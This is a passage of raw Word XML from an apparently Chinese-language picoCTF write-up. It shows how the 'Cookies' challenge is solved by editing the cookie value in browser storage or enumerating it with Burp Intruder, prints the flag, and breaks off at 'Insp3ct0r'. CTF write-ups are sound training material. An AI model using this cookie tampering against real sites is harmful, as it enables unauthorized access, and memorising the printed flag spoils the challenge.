    <w:p w14:paraId="2CDE31B1" w14:textId="6325287E" w:rsidR="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4BB163FD" w14:textId="77777777" w:rsidR="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174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Cookies</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F55C217"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 | 40 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4803DCBF" w14:textId="77777777" w:rsidR="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174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573876E8" w14:textId="77777777" w:rsidR="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174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369539" w14:textId="77777777" w:rsidR="0096174C" w:rsidRDefault="0096174C" w:rsidP="0096174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507779C" w14:textId="6A568B8D" w:rsidR="0096174C" w:rsidRDefault="0096174C"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Who doesn't love cookies? Try to figure out the best one. </w:t>
      </w:r>
      <w:hyperlink r:id="rId54" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:17781/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="15349D6F" w14:textId="1E8857E9"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25638CC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点击链接，页面如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="771D3D8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7CE78ED" w14:textId="41AB7931"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0B3EFBB" wp14:editId="6FE4D83E">
            <wp:extent cx="6332220" cy="457073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570730"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0701F2F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0D1CF08"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随便在框里输入内容，显示如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C004AA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23E0140" w14:textId="747713E0"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1B3DEDAB" wp14:editId="63226DF7">
            <wp:extent cx="6332220" cy="37312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731260"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FC2E0B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234D9D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输出返回无效的</w:t>
      </w:r>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>cookie</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="409556B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C2C3C8B"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这题也有两种写法！！！！</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="081B625D"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99304D" w14:textId="3BEC7F45"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一、检查开发人员工具的选项卡（查看</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>torage</w:t>
      </w:r>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>irefox</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18DEBB63" w14:textId="34D517EB"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5A588584" wp14:editId="161AA3C2">
            <wp:extent cx="6332220" cy="29019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33C78E6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AE92D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943BC90"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显示</w:t>
      </w:r>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>cookie</w:t>
      </w:r>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>为</w:t>
      </w:r>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>-1</w:t>
      </w:r>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>，我们修改为正值，得到如下页面：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06A5A939" w14:textId="7A97C9A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drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2C1F66CE" wp14:editId="2A44C425">
            <wp:extent cx="6332220" cy="12674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8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="1267460"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C59991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34520535"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499E8889" w14:textId="289A9079" w:rsid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r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>一直试到了</w:t>
      </w:r>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>18</w:t>
      </w:r>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>，刷新页面得到</w:t>
      </w:r>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>flag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5377A2A7" w14:textId="77777777" w:rsidR="00974072" w:rsidRPr="004A6D37" w:rsidRDefault="00974072" w:rsidP="00974072">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004A6D37">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>Modify Value to 18, press enter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CA5394A" w14:textId="0E056BAA" w:rsidR="00974072" w:rsidRPr="00974072" w:rsidRDefault="00974072" w:rsidP="00974072">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004A6D37">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>Then refresh the page</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61E8D825" w14:textId="637BDCB3" w:rsidR="00974072" w:rsidRPr="00974072" w:rsidRDefault="00974072" w:rsidP="00974072">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="21CEA070" wp14:editId="650FC236">
            <wp:extent cx="6332220" cy="2289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9"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="2289810"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CB8DE41"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5FE1E0A4"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773DE4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二、</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>burpsuit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>拦截</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3323167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420E65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我拦截的是这个页面，原页面也可以</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D32342F"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6A08C3F7" w14:textId="29D3FC5A" w:rsidR="00974072" w:rsidRPr="00974072" w:rsidRDefault="004A6D37" w:rsidP="00974072">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:noProof/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6E774CAB" wp14:editId="70A94BF5">
            <wp:extent cx="6334125"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2524125"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D52D336"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1D7DC1D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7C814ADC" w14:textId="77777777" w:rsidR="00974072" w:rsidRPr="00974072" w:rsidRDefault="00974072" w:rsidP="00974072">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0721D542" w14:textId="77777777" w:rsidR="00974072" w:rsidRPr="00974072" w:rsidRDefault="00974072" w:rsidP="00974072">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FBEA62C" w14:textId="30E0D343" w:rsidR="00974072" w:rsidRDefault="00974072" w:rsidP="004A6D37">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3DEFD491" w14:textId="6C83AE5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739F86F6" w14:textId="0116FF8E"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Send to intruder</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6995A4B8"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1C9E6911" w14:textId="7C052F2D"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6DEFD718" wp14:editId="4DE7BCE5">
            <wp:extent cx="6332220" cy="197675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1"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="1976755"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="78986DB0" w14:textId="77777777"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p>
    <w:p w14:paraId="43EDB370" w14:textId="25ABD002" w:rsidR="00974072" w:rsidRDefault="00974072" w:rsidP="0096174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B579FB6" wp14:editId="7B96F1CA">
            <wp:extent cx="6256562" cy="4221846"/>
            <wp:effectExtent l="0" t="0" r="0" b="762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6256562" cy="4221846"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="238F57C5" w14:textId="08784621" w:rsidR="0096174C" w:rsidRDefault="00000000" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:pict w14:anchorId="4DF9EFFB">
          <v:rect id="Ink 39" o:spid="_x0000_s1033" style="position:absolute;margin-left:217.4pt;margin-top:303.5pt;width:194.5pt;height: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6mm">
            <v:stroke opacity="21845f" endcap="square"/>
            <v:path shadowok="f" o:extrusionok="f" fillok="f" insetpenok="f"/>
            <o:lock v:ext="edit" rotation="t" aspectratio="t" verticies="t" text="t" shapetype="t"/>
            <o:ink i="AHMdA4gFdAEQWM9UiuaXxU+PBvi60uGbIgMTSBRE//kDRawCRwFG2ARXCQAAAAUCC2QZGDIKgcf/&#10;/w+Ax///DzMKgcf//w+Ax///DwonCYd4bvvDbzbJXC9CZe4L0IcnGao7Oc0cCnGgCgARIADmTqzp&#10;udgB&#10;" annotation="t"/>
          </v:rect>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00974072">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7C40D8A2" wp14:editId="6F5357F8">
            <wp:extent cx="6332220" cy="451612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63"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="4516120"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A60EF6E" w14:textId="30539C1A" w:rsidR="004A6D37" w:rsidRDefault="004A6D37" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12986957" w14:textId="7C0DE48D" w:rsidR="004A6D37" w:rsidRDefault="004A6D37" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C05ED09" w14:textId="6B72E4D1" w:rsidR="004A6D37" w:rsidRPr="004A6D37" w:rsidRDefault="004A6D37" w:rsidP="0096174C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r w:rsidRPr="004A6D37">
        <w:rPr>
          <w:highlight w:val="yellow"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>The response length of 18 is quite different with other response</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EE7DE9A" w14:textId="52F1EB36" w:rsidR="004A6D37" w:rsidRDefault="004A6D37" w:rsidP="004A6D37">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>得到</w:t>
      </w:r>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>flag</w:t>
      </w:r>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00974072">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>{3v3ry1_l0v3s_c00k135_96cdadfd}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25D962E4" w14:textId="1FB38A5D" w:rsidR="00582B93" w:rsidRDefault="00582B93" w:rsidP="004A6D37">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45CFDAD7" w14:textId="520B47C4" w:rsidR="00582B93" w:rsidRDefault="00582B93" w:rsidP="004A6D37">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15CD05FE" w14:textId="756BA84D" w:rsidR="00582B93" w:rsidRDefault="00582B93" w:rsidP="004A6D37">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E2499AB" w14:textId="1D280D2A" w:rsidR="00582B93" w:rsidRDefault="00582B93" w:rsidP="004A6D37">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="248DC825" w14:textId="6E43FCA5" w:rsidR="00582B93" w:rsidRDefault="00582B93" w:rsidP="004A6D37">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4140318A" w14:textId="77777777" w:rsidR="00582B93" w:rsidRDefault="00582B93" w:rsidP="004A6D37">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="557BD11A" w14:textId="77777777" w:rsidR="00582B93" w:rsidRDefault="00582B93" w:rsidP="00582B9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Insp3ct0r</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A11C2C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66699764" w14:textId="77777777" w:rsidR="00582B93" w:rsidRDefault="00582B93" w:rsidP="00582B9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7BE1CE63" w14:textId="77777777" w:rsidR="00582B93" w:rsidRDefault="00582B93" w:rsidP="00582B9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20B79DDC" w14:textId="77777777" w:rsidR="00582B93" w:rsidRDefault="00582B93" w:rsidP="00582B9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F2FB7FF" w14:textId="61B5119B" w:rsidR="00582B93" w:rsidRDefault="00582B93"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Kishor Balan tipped us off that the following code may need inspection: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="F3A4B5"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>https://jupiter.challenges.picoctf.org/problem/41511/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> (</w:t>
      </w:r>
      <w:hyperlink r:id="rId64"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65" w:history="1">
        <w:r w:rsidR="004C0F07" w:rsidRPr="004C12C8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://jupiter.challenges.picoctf.org:41511</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0A244DC4" w14:textId="75928847"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p>
    <w:p w14:paraId="11830A20" w14:textId="027D3234"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Inspector HTML  || </w:t>
      </w:r>
      <w:bookmarkStart w:id="44" w:name="_Hlk112454920"/>
      <w:r>
        <w:rPr>
